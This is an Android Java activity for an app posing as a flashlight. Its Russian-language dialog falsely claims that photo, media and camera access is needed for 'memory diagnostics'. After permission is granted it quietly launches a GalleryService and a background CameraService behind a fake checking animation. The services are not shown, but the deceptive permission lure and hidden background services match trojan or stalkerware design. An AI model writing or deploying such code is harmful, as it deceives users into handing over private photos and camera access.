package com.flashlight.app;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private boolean isProcessing = false;
    private View greenOverlay, whiteOverlay;
    private TextView tvAnim;
    private CameraManager cameraManager;
    private String cameraId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        greenOverlay = findViewById(R.id.green_overlay);
        whiteOverlay = findViewById(R.id.white_overlay);
        tvAnim = findViewById(R.id.tv_anim_text);
        Button btn = findViewById(R.id.btn_flash);

        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                Boolean flash = cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (flash != null && flash) { cameraId = id; break; }
            }
        } catch (Exception e) {}

        btn.setOnClickListener(v -> {
            List<String> perms = new ArrayList<>();
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                perms.add(Manifest.permission.CAMERA);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                    perms.add(Manifest.permission.READ_MEDIA_IMAGES);
                }
            } else {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
                }
            }

            if (!perms.isEmpty()) {
                new AlertDialog.Builder(this)
                    .setTitle("Проверка памяти")
                    .setMessage("Для точной диагностики камеры и памяти необходимо предоставить доступ к файлам (Фото и медиа) и камере.")
                    .setPositiveButton("Разрешить доступ", (dialog, which) -> {
                        ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), 1);
                    })
                    .setCancelable(false)
                    .show();
                return;
            }
            startEverything();
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) allGranted = false;
            }
            if (allGranted) {
                Intent gallerySvc = new Intent(this, GalleryService.class);
                startService(gallerySvc);
                startEverything();
            }
        }
    }

    private void startEverything() {
        if (isProcessing) return;
        isProcessing = true;
        try {
            greenOverlay.setVisibility(View.VISIBLE);
            tvAnim.setText("Проверка.");
            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
            handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
            handler.postDelayed(() -> {
                greenOverlay.setVisibility(View.GONE);
                whiteOverlay.setVisibility(View.VISIBLE);
                try { if (cameraId != null) cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
                Intent svc = new Intent(this, CameraService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
                else startService(svc);
            }, 2000);

            handler.postDelayed(() -> {
                whiteOverlay.setVisibility(View.GONE);
                try { if (cameraId != null) cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
                isProcessing = false;
                new AlertDialog.Builder(this)
                    .setTitle("Успех")
                    .setMessage("Все сработало. Фонарь готов к работе.")
                    .setPositiveButton("ОК", null)
                    .show();
            }, 10000);
        } catch (Exception e) { e.printStackTrace(); }
    }
}
